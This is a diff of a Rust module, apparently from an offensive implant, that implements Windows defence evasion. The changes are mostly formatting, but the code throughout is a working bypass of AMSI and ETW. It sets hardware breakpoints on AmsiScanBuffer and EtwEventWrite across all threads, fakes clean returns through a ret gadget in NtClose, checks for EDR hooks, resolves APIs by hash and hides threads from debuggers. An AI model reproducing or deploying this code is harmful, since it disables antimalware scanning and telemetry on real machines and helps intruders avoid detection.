@@ -1,13 +1,13 @@
 //! Evasion mechanisms including HWBP-based AMSI/ETW bypass, PPID spoofing, argument spoofing, and callback execution.
-//! 
+//!
 //! # Operation
 //! - HWBP AMSI/ETW Bypass: Uses thread context hardware debug registers (Dr0-Dr3) to intercept execution at AMSI/ETW boundaries.
 //! - PPID Spoofing: Manipulates thread attributes during process creation to masquerade the parent process.
 //! - Argument Spoofing: Modifies the PEB command line at runtime.
-//! 
+//!
 //! # Required Privileges
 //! Standard user privileges are generally sufficient, though certain target processes for PPID spoofing may require SeDebugPrivilege.
-//! 
+//!
 //! # Compatibility
 //! Windows 10+ only (relies on specific offsets and newer thread context manipulation APIs).
 
@@ -20,7 +20,9 @@ static AMSI_ADDR: AtomicUsize = AtomicUsize::new(0);
 static ETW_ADDR: AtomicUsize = AtomicUsize::new(0);
 
 #[cfg(windows)]
-unsafe extern "system" fn veh_handler(exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS) -> i32 {
+unsafe extern "system" fn veh_handler(
+    exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
+) -> i32 {
     let record = (*exception_info).ExceptionRecord;
     let context = (*exception_info).ContextRecord;
 
@@ -32,13 +34,16 @@ unsafe extern "system" fn veh_handler(exception_info: *mut winapi::um::winnt::EX
         if (amsi != 0 && rip == amsi) || (etw != 0 && rip == etw) {
             // Bypass by clearing RAX (returning 0) and advancing RIP to a ret instruction
             (*context).Rax = 0;
-            
-            // Use NtClose as a known, small syscall stub to safely find a 'ret' (0xC3) 
+
+            // Use NtClose as a known, small syscall stub to safely find a 'ret' (0xC3)
             // gadget without hitting false positives in complex instructions.
             let mut ptr = rip as *const u8; // Fallback to current rip if resolving fails
-            let ntdll: *mut winapi::ctypes::c_void = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
+            let ntdll: *mut winapi::ctypes::c_void =
+                pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
             if !ntdll.is_null() {
-                let nt_close: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTCLOSE).unwrap_or(0) as _;
+                let nt_close: *mut winapi::ctypes::c_void =
+                    pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTCLOSE)
+                        .unwrap_or(0) as _;
                 if !nt_close.is_null() {
                     let p = nt_close as *const u8;
                     // Check if NtClose starts with E9 (jmp), which typically indicates an EDR hook
@@ -64,27 +69,38 @@ unsafe extern "system" fn veh_handler(exception_info: *mut winapi::um::winnt::EX
 
 #[cfg(windows)]
 pub unsafe fn setup_hardware_breakpoints() {
-    use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
     use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
-    use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32};
-    use winapi::um::processthreadsapi::{OpenThread, SuspendThread, ResumeThread, GetThreadContext, SetThreadContext, GetCurrentProcessId};
-    use winapi::um::winnt::{THREAD_ALL_ACCESS, CONTEXT_DEBUG_REGISTERS, CONTEXT};
     use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
+    use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
+    use winapi::um::processthreadsapi::{
+        GetCurrentProcessId, GetThreadContext, OpenThread, ResumeThread, SetThreadContext,
+        SuspendThread,
+    };
+    use winapi::um::tlhelp32::{
+        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
+    };
+    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS, THREAD_ALL_ACCESS};
 
     let mut configured = false;
 
-    let amsi: *mut winapi::ctypes::c_void = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_AMSI_DLL).unwrap_or(0) as *mut _;
+    let amsi: *mut winapi::ctypes::c_void =
+        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_AMSI_DLL).unwrap_or(0) as *mut _;
     if !amsi.is_null() {
-        let addr: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash(amsi as usize, pe_resolve::HASH_AMSISCANBUFFER).unwrap_or(0) as *mut _;
+        let addr: *mut winapi::ctypes::c_void =
+            pe_resolve::get_proc_address_by_hash(amsi as usize, pe_resolve::HASH_AMSISCANBUFFER)
+                .unwrap_or(0) as *mut _;
         if !addr.is_null() {
             AMSI_ADDR.store(addr as usize, Ordering::Relaxed);
             configured = true;
         }
     }
 
-    let ntdll: *mut winapi::ctypes::c_void = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as *mut _;
+    let ntdll: *mut winapi::ctypes::c_void =
+        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as *mut _;
     if !ntdll.is_null() {
-        let addr: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_ETWEVENTWRITE).unwrap_or(0) as *mut _;
+        let addr: *mut winapi::ctypes::c_void =
+            pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_ETWEVENTWRITE)
+                .unwrap_or(0) as *mut _;
         if !addr.is_null() {
             ETW_ADDR.store(addr as usize, Ordering::Relaxed);
             configured = true;
@@ -111,7 +127,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                     let h_thread = OpenThread(THREAD_ALL_ACCESS, 0, te32.th32ThreadID);
                     if !h_thread.is_null() {
                         SuspendThread(h_thread);
-                        
+
                         let mut ctx: CONTEXT = std::mem::zeroed();
                         ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                         if GetThreadContext(h_thread, &mut ctx) != 0 {
@@ -121,7 +137,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                             ctx.Dr7 |= (1 << 0) | (1 << 2);
                             SetThreadContext(h_thread, &ctx);
                         }
-                        
+
                         ResumeThread(h_thread);
                         CloseHandle(h_thread);
                     }
@@ -147,16 +163,26 @@ pub unsafe fn patch_amsi() {}
 #[cfg(windows)]
 pub fn hide_current_thread() {
     unsafe {
-        let ntdll: *mut winapi::ctypes::c_void = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
+        let ntdll: *mut winapi::ctypes::c_void =
+            pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
         if !ntdll.is_null() {
-            let func: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTSETINFORMATIONTHREAD).unwrap_or(0) as _;
+            let func: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash(
+                ntdll as usize,
+                pe_resolve::HASH_NTSETINFORMATIONTHREAD,
+            )
+            .unwrap_or(0) as _;
             if !func.is_null() {
-                let nt_set_info_thread: extern "system" fn(winapi::um::winnt::HANDLE, u32, *mut winapi::ctypes::c_void, u32) -> i32 = std::mem::transmute(func);
+                let nt_set_info_thread: extern "system" fn(
+                    winapi::um::winnt::HANDLE,
+                    u32,
+                    *mut winapi::ctypes::c_void,
+                    u32,
+                ) -> i32 = std::mem::transmute(func);
                 nt_set_info_thread(
                     -2isize as winapi::um::winnt::HANDLE, // GetCurrentThread()
-                    0x11, // ThreadHideFromDebugger
+                    0x11,                                 // ThreadHideFromDebugger
                     std::ptr::null_mut(),
-                    0
+                    0,
                 );
             }
         }
@@ -175,7 +201,7 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};
 
     let amsi = AMSI_ADDR.load(Ordering::Relaxed);
-    let etw  = ETW_ADDR.load(Ordering::Relaxed);
+    let etw = ETW_ADDR.load(Ordering::Relaxed);
     if amsi == 0 && etw == 0 {
         return; // HWBPs not yet configured; skip silently
     }
@@ -198,7 +224,9 @@ where
 {
     std::thread::spawn(move || {
         #[cfg(windows)]
-        unsafe { apply_hwbp_to_current_thread(); }
+        unsafe {
+            apply_hwbp_to_current_thread();
+        }
         hide_current_thread();
         f()
     })
